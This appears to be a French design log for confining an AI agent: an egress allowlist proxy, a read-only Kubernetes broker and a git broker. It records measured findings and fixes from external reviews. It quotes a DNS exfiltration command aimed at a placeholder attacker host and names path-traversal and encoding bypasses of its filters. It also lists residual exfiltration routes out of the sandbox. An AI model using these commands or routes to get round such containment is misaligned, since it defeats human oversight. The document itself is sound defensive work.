| CA | **aucune**, rien à distribuer | store système + env Python/Node ; le pinning casse |
| Journal | destination, décision | idem, plus méthode, chemin, statut |

- [x] **Un seul outil pour les deux niveaux** : le même `mitmdump` — `ignore_hosts: .*` pour le niveau 1 (TLS brut), interception au niveau 2. Squid/tinyproxy écartés : ils auraient ajouté un second composant pour le niveau 2.
- [x] **Refuser les destinations internes** : RFC1918, loopback, lien-local, multicast, CGNAT — pour une **IP littérale comme pour un nom résolu**, la résolution ayant lieu *avant* l'ouverture de la connexion. Un domaine autorisé qui pointerait vers le LAN défairait sinon la Phase 1. Une résolution qui échoue refuse.
- [x] **Journaliser chaque requête** : une ligne de politique (`egress-allow: hôte:port`, `egress-deny: <raison> hôte:port`) — aucun corps, jamais. La raison distingue `internal`, `not-allowlisted`, `malformed`. C'est la matière de la Phase 7.
- [x] `agent_egress_proxy_tls_intercept: false` par défaut ; le coût du niveau 2 est dit **avant** de l'activer (README + `all.yml.example`) : CA à distribuer partout, pinning cassé.
- [x] **Fail-closed vérifié** : proxy arrêté, la zone agent n'a plus **aucun** egress et ne bascule pas en direct.
- [x] **Zone de confiance, aux deux niveaux** : le proxy tourne sous `broker`, jamais sous l'uid du harnais — pas seulement par la règle du §0, mais parce que le filtre coupe tout egress non-loopback de l'uid du harnais : un proxy sous cet uid ne pourrait pas sortir. La phrase du §3 d'origine (« le niveau 1 peut rester hors zone de confiance ») était donc **fausse**, et activer le proxy implique `trust_zone_enabled`.
- [x] **Egress du proxy : rien à ajouter à la Phase 1** — confirmé : UFW sort en `ACCEPT` et l'uid de la zone de confiance n'est pas filtré.
- [ ] Quotas / rate-limits par destination : **écarté**, décision utilisateur — l'alerte sur volume anormal (Phase 7) couvre le cas, et le proxy n'est pas le bon endroit pour tenir un état d'usage.
- Le proxy **résout lui-même** les noms : la zone agent n'a besoin d'aucun DNS, et son blocage du port 53 reste donc entier.
- [x] **`*` — « tout l'internet, sauf interne »** : une entrée `*` autorise n'importe quel **hôte public**, sur 80 et 443 (`*:8443` pour un autre port — `*` n'ouvre pas tous les ports). C'est le besoin d'un agent de recherche, qui doit sortir partout mais ne doit pas voir le LAN — et le refus des destinations internes, qui reste, est justement le contrôle qui tient. Ce que ça coûte, et c'est consigné : le contrôle **par destination** disparaît (par construction), et **le canal DNS se rouvre** — chaque nom étant légitime, chaque nom est résolu, alors qu'un nom hors allowlist est refusé aujourd'hui sans jamais être résolu.

**Ce que les mesures ont établi** — les pièges qui ne se voient pas à l'œil nu :

| Point | Résultat mesuré |
|---|---|
| `@dataclass` dans un script mitmproxy | **Ne fonctionne pas** : le chargeur de scripts n'enregistre pas le module dans `sys.modules`, et `dataclasses._is_type` s'y appuie → `AttributeError` à l'import, service en échec de démarrage. Classe simple. |
| Journal du service | **Rien n'arrivait dans le journal** alors que le service traitait les requêtes : mitmproxy journalise sur **stdout**, bufferisé en bloc hors terminal. `PYTHONUNBUFFERED=1` dans l'unité — vérifié, les lignes arrivent en temps réel. Sans ça, la piste d'audit de la Phase 7 serait arrivée par paquets et perdue au crash. |
| Ordre CONNECT ↔ décision | `HttpConnectHook` est émis **avant** la construction de la couche suivante, et une réponse non-2xx coupe le tunnel **sans ouvrir de connexion amont** (vérifié dans la source, puis en 403 réel). Le refus est donc une décision, pas une coupure après coup. |
| Niveau 1 sans CA | `ignore_hosts: .*` suffit : `openssl s_client -proxy … -connect example.com:443` présente l'**émetteur réel** du site (vérifié), donc aucun certificat à distribuer. La décision d'ignorance lit `context.server.address`, absente sur la connexion cliente initiale : la couche HTTP est bien créée et le CONNECT lu. |
| Résolution | La zone agent **ne résout plus** (`getent hosts` échoue) et la requête proxifiée aboutit quand même : c'est le proxy qui résout. |
| Options de script | `opts.set(..., defer=True)` : les `--set` de la CLI sont différés **après** le chargement des scripts, donc une option définie par l'addon est réglable depuis l'unité. |
| Corps | `stream_large_bodies` n'existe plus en v12 (vérifié par `mitmdump --help`) : les corps ne sont pas retenus, et la borne mémoire est `MemoryMax=` côté systemd. |
| Accumulation des flux | Mesuré : **1 000 requêtes refusées → +0,6 Mo de RSS** (≈0,6 Ko par flux, 200 req/s). Pas d'accumulation qui condamne un service au long cours ; `MemoryMax` reste la borne. |
| `is_private` et le CGNAT | **Inerte** pour `100.64.0.0/10` sur l'interpréteur du proxy (3.12.14 : `is_private=False`, comme sur 3.14.4, alors qu'il vaut `True` pour 192.168/16). La plage RFC 6598 est donc nommée explicitement — `is_global` seul ne suffirait pas non plus, il vaut `True` pour le multicast. |
| Retrait de la CA | `update-ca-certificates` seul **laisse des liens cassés** dans `/etc/ssl/certs` — le lien nommé *et* le lien de hachage (`find /etc/ssl/certs -xtype l`). Le retrait passe donc par `--fresh`, qui reconstruit tout. |

**Niveau 2, vérifié à son tour.** La CA est générée **au démarrage** du service — pas à la première interception — dans le `confdir` de la zone de confiance : c'est ce qui rend l'ordre du rôle honnête (démarrer, constater la CA, la publier). `update-ca-certificates` la pose dans `/etc/ssl/certs` et les clients l'acceptent **sans `-k`**. Le test qui distingue les deux niveaux est l'émetteur présenté au client : **l'émetteur réel du site** au niveau 1, `CN=mitmproxy` au niveau 2. La clé privée reste en `0600` dans le home de la zone de confiance, illisible par la zone agent. Repasser en niveau 1 **retire la CA du store système mais garde la clé** : la CA reste stable, donc aucune redistribution à chaque bascule.

**Persistance, bascules et réversibilité, vérifiées** : après reboot, les trois services remontent, le proxy écoute sur `127.0.0.1:8080`, le filtre nftables est chargé et l'allowlist s'applique — le port amont du gateway reste fermé. `agent_egress_proxy_enabled: false` retire unité, config, venv, profil **et** la CA, et rend à la zone agent son état de socle (aucun egress, aucune résolution) sans toucher au gateway. Deuxième passage du play : **aucun `changed`** sur le rôle. Repasser du niveau 2 au niveau 1 retire la CA du store et rend l'émetteur réel du site.

**Corrigé après une review externe.** La **résolution DNS avait lieu avant la vérification de l'allowlist** : le proxy résolvait donc tout nom que l'agent lui soumettait, y compris hors allowlist, et lui offrait de ce fait un canal de sortie par les noms de requête (le `curl -x … http://<données>.c2.attacker.com` sortait vraiment, puis se faisait refuser). L'allowlist est désormais évaluée **d'abord et sans toucher au réseau** ; la résolution ne sert plus qu'aux hôtes autorisés, où elle garde son rôle anti-rebinding. Trois corollaires : un nom autorisé mais non résolvable porte la raison `unresolved` (et non `internal`, qui doit rester le signal d'une sonde vers le LAN) ; la correspondance de chemin se fait sur des **frontières de segment** (`/v1` n'autorise plus `/v1-secret` et autorise `/v1` lui-même), et sur le **chemin que l'origine résoudra** : la query string est retirée — `Request.path` la porte, donc `/v1/search?q=1` était refusé à tort — et les segments `.`/`..`, encodés compris, sont résolus, sans quoi `/v1/../admin` franchissait une règle `/v1` pour atteindre `/admin` en amont (résidu : un amont qui décoderait **deux fois**, `%252e%252e`, reste hors de portée) ; et un **pré-vol** valide l'allowlist dans `pre_tasks`, avant la levée du filtre — le rôle échouait sinon au milieu du play, filtre levé (le reste de la fenêtre de la Phase 1 reste ce qu'il était : c'est le `make audit` de la Phase 7 qui la rend détectable).

**Un point de cette review est rejeté, mesure à l'appui :**

| Point | Ce qui a été mesuré |
|---|---|
| Conditionner le chown récursif du venv à l'installation (« 20 à 40 s par run ») | **0,65 s** mesurés sur le venv de mitmproxy, 1,21 s pour celui de litellm (≈20 000 fichiers) au même run. Même rejet qu'en Phase 2, et pour la même raison : gater sur la version laisserait un `broker_name` modifié sans accès groupe — panne silencieuse. |

**Risques résiduels, consignés :**

1. **TOCTOU de résolution** : l'addon résout pour contrôler, mitmproxy résout pour connecter. Une réponse DNS qui changerait entre les deux échapperait au contrôle — négligeable dans une sandbox mono-agent, mais c'est écrit.
2. **Niveau 2 et `certifi`** : les outils qui appellent `certifi.where()` directement ne lisent ni le store système ni `SSL_CERT_FILE`. À traiter avec la Phase 8, sur le venv du harnais.
3. **Point de panne unique** pour l'egress web : `Restart=always`, et l'absence de repli est la propriété recherchée, pas un défaut.
4. **`getaddrinfo` bloque la boucle d'événements** le temps d'une résolution, et **le cache par hôte croît avec les hôtes autorisés** : négligeable en allowlist stricte, ~1-2 Mo pour 10 000 domaines sous `*`, et borné par `MemoryMax`. À revoir si mitmproxy expose un jour un hook de résolution.
5. **La politique est déclarative** : l'agent peut atteindre tout ce que l'allowlist déclare. Un domaine autorisé reste un canal d'exfiltration — c'est la Phase 7 (alerte sur volume) qui porte cette limite, pas le proxy.
6. **Un conteneur n'atteint le proxy qu'en `--network=host` — et sous `runsc`, ce flag seul ne suffit pas** (mesuré en Phase 4, détail au tableau des mesures de cette phase) : il faut **deux** flags indépendants, celui de Podman (partager le netns de l'hôte) *et* celui de runsc (`--runtime-flag network=host`, hostinet au lieu du netstack). Sans le second, le sandbox se retrouve **sans aucune interface** et `127.0.0.1` n'est joignable par personne. Avec son propre netns, `127.0.0.1:8080` est de toute façon *son* loopback. Le proxy sert le harnais nu ; un conteneur qui a besoin du web passe par les deux flags.

**Ce qui reste dehors, et pourquoi :**

- **Injection de credential** par le proxy : c'est le patron des brokers (Phase 5), et ce serait un secret de plus à faire vivre. Le proxy sert l'egress web générique.
- **Inspection de contenu** : le niveau 2 rend les corps visibles, il ne les juge pas. La journalisation ne les enregistre pas — la Phase 7 décidera de ce qui mérite d'être conservé, et où.
- **Ne jamais router les jetons des brokers** (k8s, git) à travers ce proxy : ils ont leurs propres exceptions d'egress et leurs propres brokers. Le `NO_PROXY` du profil exclut le loopback pour la même raison (le gateway d'inférence n'y passe pas).

### Extensions optionnelles

> Chaque extension ajoute un broker à la zone de confiance. **Aucune n'est requise** : un agent purement conversationnel n'a besoin ni de l'une ni de l'autre.

#### ✅ Phase 4 — Broker Kubernetes (lecture seule) *(faite)*

Cas d'usage : agent SRE. **Pas de MITM, pas de CA interne** — le harnais parle en HTTP clair à un port loopback, le broker fait le TLS en amont.

Implémentation : **`kubectl proxy`** (`k8s-broker.service`, `k8s_broker_enabled`), sous l'utilisateur de la zone de confiance. Aucun code à écrire : il fait le TLS amont, suit les `watch` (flux longs, qu'un reverse proxy naïf bufferiserait) et porte déjà le filtre de requêtes. Comme le proxy L7 en Phase 3, c'est l'outil existant plutôt qu'une réimplémentation.

**Le RBAC vit sur le cluster, pas dans ce dépôt.** Le projet ne possède pas le cluster et n'a aucune raison de laisser un kubeconfig d'admin sur le poste : le rôle **livre** le manifeste (`roles/k8s_broker/files/k8s-broker-rbac.yaml` — Namespace, ServiceAccount, ClusterRole, binding, Secret de jeton), le déploiement le pose, et le README donne les commandes qui produisent le kubeconfig que le play consomme.

- [x] **La VM agent n'est pas un nœud k3s** — vérifié (aucun binaire kube, aucun `/etc/rancher`, aucune unité), **et le rôle l'assère** : le kubeconfig d'un serveur k3s est cluster-admin, un broker alimenté avec lui livrerait le cluster à l'agent.
- [x] ServiceAccount + ClusterRole **explicite** (jamais le `view` intégré, dont le contenu bouge entre versions) :

```yaml
kind: ClusterRole
metadata: { name: sre-readonly }
rules:
  # The archetypal SRE questions: why is this pod pending, why is this volume unbound.
  - apiGroups: [""]
    resources: ["pods","services","endpoints","configmaps","nodes","namespaces","events",
                "persistentvolumeclaims","persistentvolumes","limitranges","resourcequotas",
                "serviceaccounts"]
    verbs: ["get","list","watch"]
  - apiGroups: [""]
    resources: ["pods/log"]
    verbs: ["get"]
  - apiGroups: ["apps","batch","networking.k8s.io","apiextensions.k8s.io"]
    resources: ["*"]
    verbs: ["get","list","watch"]
  - apiGroups: ["discovery.k8s.io","autoscaling","policy","storage.k8s.io","coordination.k8s.io"]
    resources: ["*"]
    verbs: ["get","list","watch"]
  # Store paths, never values. The stores and generators are deliberately absent.
  - apiGroups: ["external-secrets.io"]
    resources: ["externalsecrets"]
    verbs: ["get","list","watch"]
  - apiGroups: ["metrics.k8s.io"]
    resources: ["*"]
    verbs: ["get","list"]
# NI secrets, NI pods/exec|portforward|attach, NI impersonate, aucun write.
```

  Livré tel quel dans `roles/k8s_broker/files/k8s-broker-rbac.yaml` (Namespace, binding et Secret de jeton compris) : à poser par l'ansible de cluster du déploiement.

- [x] Vérification côté cluster : `kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>` — le seul contrôle qui dise ce que le jeton fait réellement (README §4). Cette sortie contient aussi un verbe **`create`** sur les trois `selfsubject*reviews` : c'est `system:basic-user`, lié à tout le monde par défaut, et ça ne change aucun état — ça répond à « ai-je le droit de… ». À ne pas confondre avec un droit d'écriture en lisant la liste.
- [x] **Jeton long** (Secret `service-account-token`, créé à la main depuis 1.24) : la rotation, c'est régénérer le kubeconfig et relancer le play. Le « 15 min + timer + reload » envisagé ici est une **impasse** — pour frapper un jeton il faut un credential, et le seul que le broker accepterait de détenir *est* le jeton : un jeton court ne ferait que déplacer le secret d'amorçage d'un cran.
- [x] Kubeconfig du broker en **`0640 root:{{ user }}`** dans le home de la zone de confiance (0700), **illisible par la zone agent**. Le `0600` prévu ici ne marchait pas : contrairement à `EnvironmentFile`, lu par systemd **en root avant** la baisse de privilèges, c'est `kubectl` qui lit ce fichier.
- [x] Unité systemd `kubectl proxy` durcie, `--address=127.0.0.1` et `MemoryMax=` :

```bash
kubectl proxy --port=<port> --address=127.0.0.1 --kubeconfig=<kubeconfig> \
  --reject-methods='POST,PUT,PATCH,DELETE' \
  --reject-paths='^/api/.*/(pods|services|nodes)/.*/(exec|attach|portforward|proxy),^/api/.*/secrets,^/apis/.*/secrets'
Restart=always
MemoryMax=<borne>
```

  `--reject-paths` **remplace** les motifs par défaut (qui ne couvrent que `exec`/`attach`) → les réinclure, et y ajouter `portforward`, `secrets` et le sous-chemin **`proxy`** des pods, services et nœuds — ce dernier fait poster l'API server vers un service interne, et même si le RBAC ne l'accorde pas, il relève du même filtre que `exec`. `--accept-hosts` **n'est pas touché** : le défaut est le loopback seul, et le port est retiré avant le match — l'élargir à `.*` aurait affaibli le contrôle sans rien résoudre. `MemoryMax=` n'est pas décoratif : c'est la seule borne mémoire du proxy (les corps ne sont pas retenus par `kubectl proxy`, mais rien ne borne le nombre de `watch` ouverts).
- [x] Kubeconfig de la zone agent : `server: http://127.0.0.1:<port>`, `token: ignore` — une **adresse**, aucun secret. C'est ce que l'image du harnais consomme.
- [x] **Deux couches indépendantes, plus une troisième** : `--reject-methods` rend le proxy read-only, le RBAC rend le jeton read-only, les chemins sensibles sont refusés. Le filtre de chemins est best-effort par nature : **le RBAC est le contrôle réel.**
- [x] `k8s_broker_enabled: false` retire unité, binaire et kubeconfigs (celui du broker **et** celui de la zone agent) : le jeton ne survit pas au composant qui l'utilisait.

**Ce que les mesures ont établi** — deux défauts ouverts par défaut, qui ne se voient pas à l'œil nu :

| Point | Résultat mesuré |
|---|---|
| `--reject-methods` par défaut | **`^$` — ne rejette rien.** Le « POST,PUT,PATCH » du plan est l'*exemple* de l'aide, pas le défaut, et il n'inclut pas `DELETE`. Le drapeau n'est pas un durcissement facultatif : sans lui le proxy laisse tout passer. |
| `--reject-methods` = liste de regex | Séparées par des virgules et compilées une par une, match **non ancré** : une alternance `^(POST\|PUT)$` serait découpée en regex invalides et le proxy mourrait au démarrage. Liste simple uniquement. |
| `--reject-paths` par défaut | `^/api/.*/pods/.*/exec,^/api/.*/pods/.*/attach` : ni `portforward`, ni `secrets`. Le poser **remplace** ces motifs. |
| `--accept-hosts` par défaut | Loopback seulement, et le port est **retiré** avant le match (`net.SplitHostPort`) : `Host: 127.0.0.1:8001` passe. La piste « ajouter `--accept-hosts='.*'` si un 403 apparaît » était donc à la fois inutile et affaiblissante. |
| Kubeconfig lu par le service | `0600 root:broker` **ne marche pas** (voir ci-dessus) : `0640 root:broker`, même forme que le `config.yaml` du gateway. |
| `/version` comme contrôle d'effet | **Ne prouve rien** : `system:public-info-viewer` est lié à `system:authenticated` **et** à `system:unauthenticated`. Le contrôle d'effet porte sur `/api`, refusé à un appelant anonyme — un port qui écoute ne prouve pas que le jeton authentifie. |
| En-têtes entrants | L'`Authorization` de l'agent est **écrasé** par le credential du kubeconfig ; en revanche `Impersonate-*` serait transmis → refusé par le RBAC, qui n'a aucun droit d'impersonation. |
| Paquet `kubernetes-client` | **Aucun candidat** sur Ubuntu 26.04 : le binaire vient de `dl.k8s.io`, épinglé **version et sha256** (`get_url: checksum:`) — le seul téléchargement du dépôt qui vérifie son artefact, et l'idempotence vient de là (pas de `stat`). |
| Conteneur de la zone agent | Un conteneur n'atteint le broker qu'avec **deux flags**, pas un : `--network=host` (Podman partage le netns de l'hôte) **et** `--runtime-flag network=host` (runsc utilise hostinet au lieu de son netstack). Mesuré : sous `runsc` avec Podman seul, le sandbox n'a **aucune interface** (`ip -o addr` vide, `Network unreachable`) — sous Podman rootless, runsc n'a pas les permissions pour reconfigurer le netns et retire les IP des interfaces ([gVisor #9398](https://github.com/google/gvisor/issues/9398)). Avec les deux flags : `lo` + `eth0` visibles, broker joignable, et **le filtre tient** — `10.20.4.10:6443` et `1.1.1.1` expirent toujours. Le second flag peut être livré globalement par le rôle `podman_gvisor` dans son enveloppe `runsc` (`podman_gvisor_hostinet`), mais il est **désactivé par défaut** : il basculerait *tous* les conteneurs en hostinet, y compris ceux qui n'ont jamais demandé le réseau de l'hôte. Le chemin étroit — recommandé — est `--runtime-flag network=host` sur le seul conteneur concerné, au même endroit que `--network=host` dans la config du harnais. (`[engine.runtimes_flags]` dans `containers.conf` ferait la même chose que le wrapper, mais cette table n'existe qu'à partir de podman 5.6 et serait **ignorée en silence** avant — d'où le wrapper, qui ne dépend d'aucune version.) Une virtual IP routable a été écartée : elle exigerait d'ouvrir une exception non-loopback dans le ruleset de la Phase 1, là où les flags n'en demandent aucune. |
| Filtre vérifiable **sans cluster** | Le filtre décide **avant** l'amont : avec un kubeconfig pointant sur un port mort, `403` = refus du filtre et `500` = requête laissée passer. Toute la pile a donc été vérifiée avant même d'avoir le kubeconfig : `DELETE`/`POST` 403, `secrets` 403 (les deux préfixes), `pods/exec` 403, `nodes/*/proxy` 403, `services/*/proxy` 403, `Host` étranger 403 — et `GET /api`, `pods/log` en **500**, donc bien laissés passer. |
| Cache de `kubectl proxy` | **Aucune écriture** dans `$HOME/.kube` : le proxy ne construit pas de client de découverte, son journal ne porte que « Starting to serve » et les erreurs d'amont. Le dossier reste donc **root:broker 0750**, comme les autres composants : le service ne peut pas remplacer le kubeconfig qu'il lit. |

**Ce qui reste dehors, et pourquoi :**

- **Appliquer le RBAC depuis le play** : non — le dépôt ne possède pas le cluster, et le faire exigerait d'y laisser un kubeconfig d'admin. Le manifeste est livré, la pose appartient au déploiement.
- **Renouvellement de jeton par le broker** : non — voir la case sur la durée de vie.
- **`kubectl` dans la zone agent** : non — le harnais exécute ses commandes dans un conteneur isolé, donc c'est le binaire de **l'image** qui sert ; un binaire nu dans la zone agent ne serait jamais utilisé. Le rôle n'installe que celui du broker (`/opt/k8s-broker/bin`, 0750, hors de portée de la zone agent).
- **Un ClusterRole « plus fin »** (namespaces nommés, ressources limitées) : c'est une décision de déploiement, pas un défaut du projet — le manifeste livré est le point de départ, à rétrécir si le cas d'usage le demande.

**Ce que `--network=host` ouvre et ce qu'il ne touche pas** — mesuré, parce que la question revient à chaque harnais conteneurisé :

| | Résultat |
|---|---|
| Filtre uid/subuid | **Tient** : le VIP du cluster, `1.1.1.1` et **le port d'Ollama** (fermé en Phase 2) expirent tous depuis le conteneur en `--network=host`. |
| Capabilities du sandbox | `CapEff=0x800405fb` : **ni `NET_RAW` ni `NET_ADMIN`** — pas de sockets brutes (donc pas d'écoute du trafic), pas de modification du pare-feu ni des interfaces de l'hôte. |
| Loopback de l'hôte | **Ouvert** : le conteneur joint le broker, le gateway et le proxy, et — mesuré — il peut **y écouter** (`python -m http.server` sur `127.0.0.1:9999` → 200 depuis l'hôte). UFW ne couvre pas le loopback. |
| Sans `--network=host`, avec hostinet seul | **Son propre loopback** : `127.0.0.1:8001` est refusé. Le drop-in global n'ouvre donc rien par lui-même — c'est la moitié Podman du couple qui déplace la frontière, par conteneur et explicitement. |
| `runsc network=host` (hostinet) | Delta d'isolation : les sockets du sandbox sont celles du **noyau de l'hôte** au lieu du netstack de gVisor — la doc gVisor le dit, ce mode « decreases the isolation to the host ». L'interposition des syscalls, elle, reste. **Et ce delta vaut même sans `--network=host`** : un conteneur dans son propre netns garde son loopback, mais ses paquets sont parsés par la pile du noyau — c'est une **surface d'attaque**, pas une joignabilité. D'où le défaut à `false`. |

**Règle qui en découle.** Sous host networking, le loopback de la VM cesse d'être privé : c'est un domaine partagé avec la zone agent. Donc **tout nouveau service qui s'écoute en loopback doit soit figurer dans `agent_egress_blocked_loopback_ports`, soit authentifier ses appelants** — le port du provider (Phase 2), le blocage DNS (Phase 1) et le port SSH de l'hôte en sont les trois instances actuelles, le broker et le proxy les portes assumées.

**Risques résiduels, consignés :**

1. **Le filtre de chemins est best-effort** : une requête encodée (`%73ecrets`) peut le franchir. Le RBAC est le contrôle réel — et il n'accorde ni `secrets` ni `pods/exec`.
2. **Les en-têtes `Impersonate-*` sont transmis** par le proxy et refusés par le RBAC : un ClusterRole qui accorderait `impersonate` ouvrirait une escalade. À ne jamais accorder.
3. **Un jeton long dans un home en 0700** : la surface restante est la VM elle-même. Rotation = régénération du kubeconfig + relance du play.
4. **Un nouveau chemin loopback pour l'agent** (`127.0.0.1:8001`), comme les routes d'admin du gateway : la Phase 7 doit le connaître.
5. **Le broker est le seul chemin vers le cluster** : `Restart=always`, et l'absence de repli est la propriété recherchée, pas un défaut.
6. **« Aucun accès aux objets `Secret` » ne veut pas dire « aucune donnée sensible »** : les variables d'environnement d'un pod (`get pods -o yaml`), les ConfigMaps de `kube-system`, et surtout les **logs** (`pods/log`, accordé — un agent SRE en a besoin) contiennent régulièrement des jetons, des chaînes de connexion ou des variables dumpées au démarrage. Le ClusterRole est cluster-wide : c'est le prix d'un agent SRE, assumé, mais c'est une surface d'exfiltration — bornée par le proxy L7 (Phase 3) et par l'alerte sur volume (Phase 7).

**Corrigé après une review externe.** Trois défauts réels : `MemoryMax=` était défini dans les variables et documenté, mais **absent de l'unité** — une variable morte, et aucune borne mémoire ; la sonde `uri` du contrôle d'effet pouvait être routée par un `HTTP_PROXY` présent dans l'environnement de la cible (d'où `use_proxy: false`) ; le filtre de chemins laissait passer les **sous-ressources `proxy`** des pods, services et nœuds, qui font poster l'API server vers un service interne. Le ClusterRole a par ailleurs été élargi aux API qu'un agent SRE lit réellement : `endpointslices` (que `kubectl describe svc` appelle), autoscalers, disruption budgets, storage classes, leases.

**Trois points rejetés, mesures et principe à l'appui :**

| Point | Ce qui a été mesuré |
|---|---|
| `--cache-dir` forcé sous le home (« kubectl écrit son cache dans `$HOME/.kube/cache`, refusé en 0750 root ») | **Aucune écriture de cache** : `kubectl proxy` ne construit pas de client de découverte — le cache appartient aux commandes `kubectl get`, pas au proxy. Le dossier reste **root:broker 0750**, la forme des autres composants. |
| Table de checksums par architecture (amd64 **et** arm64) | Le projet **provisionne de l'amd64** (`ubuntu-26.04-server-cloudimg-amd64`), et `runsc` comme `uv` sont déjà figés en `x86_64`. Une table serait de la machinerie pour une plateforme que le dépôt ne déploie pas ; **une assertion** le dit en trois lignes, avec un message qui dit quoi faire. |
| `apiGroups: ["*"]` pour couvrir les CRDs d'un coup | Refusé : cette règle lirait aussi **chaque futur CR** et chaque sous-ressource de chaque groupe, sans que le fichier ne le dise — alors que le RBAC est précisément le contrôle sur lequel ce design s'appuie. Le manifeste montre comment **nommer** ses groupes, et `apiextensions.k8s.io` donne déjà la carte des CRDs présents. |

#### ✅ Phase 5 — Broker git (branches, push, PR, LFS) *(faite)*

Cas d'usage : agent SRE. **Pas de MITM, pas de CA interne** — le harnais parle en clair à deux ports loopback, et la zone de confiance porte le transport autant que les credentials.

**Le SSH déplace l'injection, il ne l'empêche pas.** Un proxy injecte en réécrivant une requête (l'en-tête `Authorization`) ; en SSH, l'authentification se joue *à l'intérieur* du canal chiffré : il n'y a rien à réécrire depuis l'extérieur. Le broker **termine** donc la session localement et la **ré-origine** avec la clé du déploiement — l'analogue exact de l'injection d'en-tête : le credential est injecté à la frontière, jamais porté par l'agent. Et c'est la forme **générique** : Forgejo, GitLab et GitHub servent tous le git en SSH sous la même forme (`user@host`, un port, une clé), là où le git HTTP change de chemin, de port et de politique selon la forge.

**Deux composants, deux responsabilités.** `git_broker` est le **cas d'usage** (le transport, et la déclaration de ce dont il a besoin) ; `token_proxy` est le **primitif** — un nginx inverse sur loopback, sous l'uid de la zone de confiance, qui sert une **liste d'endpoints déclarée** et ne connaît ni forge ni git. Même séparation que §0 pose pour l'egress : un proxy configurable est le primitif, un broker est un cas d'usage. Le prochain service interne n'aura qu'à se déclarer.

- [x] **Compte dédié, clé de déploiement en écriture, PAT minimal.** Le cloisonnement vient du credential : une **clé de déploiement est scopée au dépôt**, là où un PAT ne l'est pas — et les versions récentes de Forgejo savent en plus restreindre un jeton à des dépôts nommés, ce dont le design ne dépend pas.
- [x] **Proxy d'injection générique** (`token_proxy`), loopback, zone de confiance, **liste déclarée** : l'API de la forge, et une entrée LFS par dépôt. Le format d'authentification est une ligne de la liste (`token TOKEN`, `Bearer TOKEN`, `PRIVATE-TOKEN: TOKEN`, `Basic TOKEN_B64`) — pas du code.
- [x] **Terminateur SSH** (`git-broker-ssh.service`) : instance `sshd` dédiée, **loopback seul**, un utilisateur dont le **shell est le relais**. L'agent garde un git 100 % natif : `clone`, `checkout -b`, `commit`, `push`, `fetch`.
- [x] **Zone agent sans credential** : clé **factice** (elle n'ouvre que le relais), alias SSH et `known_hosts` épinglés, règles `insteadOf` pour LFS. Aucun credential helper. `git+ssh` n'est pas proscrit : il est **ré-originé**.
- [x] **Protection de branche** — le contrôle porteur, avec les réglages exacts : `enable_push` + `enable_push_whitelist` dont la liste blanche ne contient **que des humains**, force-push interdit, **tags protégés**, `push_whitelist_deploy_keys` laissé désactivé — et la *merge allowlist* (`enable_merge` + `enable_merge_whitelist`), parce que merger est une seconde porte vers le même endroit.
- [x] **Le merge est un geste humain, donc le proxy le refuse par son nom** : `POST …/pulls/N/merge` était admis par la location préfixe qui porte les propositions, donc l'invariant ne tenait que par un réglage de forge — et la recette de protection de branche seule ne le produisait pas. Fermé par défaut (`git_broker_allow_merge: false`) sous la forme d'une **location regex par dépôt refusé**, portée par l'entrée proposition sous la clé générique `refused_paths` : une regex gagne sur un préfixe, donc elle intercepte avant lui, sans toucher au `POST /pulls` (création de PR). `git_broker_merge_whitelist` (`[]` ou `["*"]` = tous) restreint l'ouverture par dépôt, et une entrée qui n'est ni `*` ni un dépôt déclaré **échoue le play** au lieu de construire un garde qui ne matcherait jamais. Périmètre : Forgejo/Gitea, où le merge est un `POST` ; sur GitHub/GitLab c'est un `PUT`, déjà hors des verbes déclarés.
- [x] **L'assertion tient ce qu'elle annonce** : elle comparait les noms de dépôts, pas les **locations dérivées** — `["a/b", "a/b/pulls"]` passait, puis produisait deux `location =` identiques et nginx refusait de démarrer (reproduit au rendu : 2 doublons sur 16 locations). Elle compare désormais l'union lecture / proposition / LFS, valide la whitelist de merge, et exige que `git_broker_repos` et `git_broker_merge_whitelist` soient bien des **listes** (`type_debug`) : une chaîne passait — itérée caractère par caractère — et donnait au relais une liste d'autorisation d'un dépôt par lettre (`/o.git`, `/w.git`…), sans que rien ne le signale.
- [x] **LFS** servi par le même proxy, avec l'endpoint obtenu par `git-lfs-authenticate` (voir le tableau). **Un seul prédicat dérivé** (`git_broker_lfs_deployed`) décide si le relais rend l'endpoint *et* si l'injection le sert : deux conditions jumelles divergeaient, et `lfs_enabled: false` avec une API déclarée faisait rendre une adresse morte (404) au lieu d'un refus.
- [ ] **Validation en CI sur la PR** (`kustomize build`, `kubeconform`, `conftest`/OPA, en statut requis) : **reste dehors** — c'est le dépôt GitOps du déploiement, pas du broker.
- [ ] **Interdire la modification du pipeline lui-même** : **reste dehors**, même raison — c'est une seconde règle de protection de branche côté forge.

**Ce que la reconnaissance a établi** (mesuré sur la VM, deux `sshd` scratch en loopback, aller-retour git réel) :

| Supposé | Réel |
|---|---|
| `SSH_ORIGINAL_COMMAND` porte la commande | **Faux** : cette variable n'est posée que si une commande *forcée* est configurée. Quand le shell de l'utilisateur **est** le relais, sshd exécute `<shell> -c <commande>` et la commande arrive en **`argv[2]`** — c'est pourquoi `git-shell` lit `argv[2]`. Un relais qui lit la mauvaise variable refuse *tout*, git légitime compris (mesuré : `SAW: []`). |
| Le shell peut être un script absent de `/etc/shells` | **Oui** : sshd l'exécute, `/etc/shells` ne le concerne pas. |
| Un compte sans mot de passe (`shadow: !`) se connecte par clé | **Seulement avec `UsePAM yes`** : avec `UsePAM no`, sshd refuse (« account is locked »). L'utilisateur de la zone de confiance est créé sans mot de passe — le réglage est obligatoire. |
| Un relais d'octets préserve git | **Oui** : `ls-remote`, `clone`, `checkout -b`, `commit`, `push` (branche créée côté amont), puis `fetch` en seconde session. |
| Ce que git envoie | `git-upload-pack '/chemin'` / `git-receive-pack '/chemin'` — verbe + chemin **entre guillemets simples** ; et `git-lfs-authenticate /chemin upload`, **sans** guillemets. D'où un relais qui découpe `argv[2]` et retire les guillemets, plutôt qu'un motif regex. |
| `restrict` dans `authorized_keys` | **Honoré** : « PTY allocation request failed on channel 0 ». |
| Les refus sont exploitables | `logger -t git-broker` → lisibles dans le journal (`refused: …`) : c'est la matière de la Phase 7. |
| La porte d'admin réutilisable | **Non** : `AllowUsers ubuntu agent` — le compte de confiance n'y est pas admis, et l'y ajouter lierait deux rôles. D'où l'instance dédiée. |
| `insteadOf` suffit pour ramener LFS sur le loopback | **Faux** : `git lfs env` montre que l'endpoint *batch* déduit du remote n'est **pas** réécrit (`Endpoint=https://git-broker/…`), alors que `lfs.url` l'est. Et `lfs.url` est global — il ne vaut que pour un dépôt. |
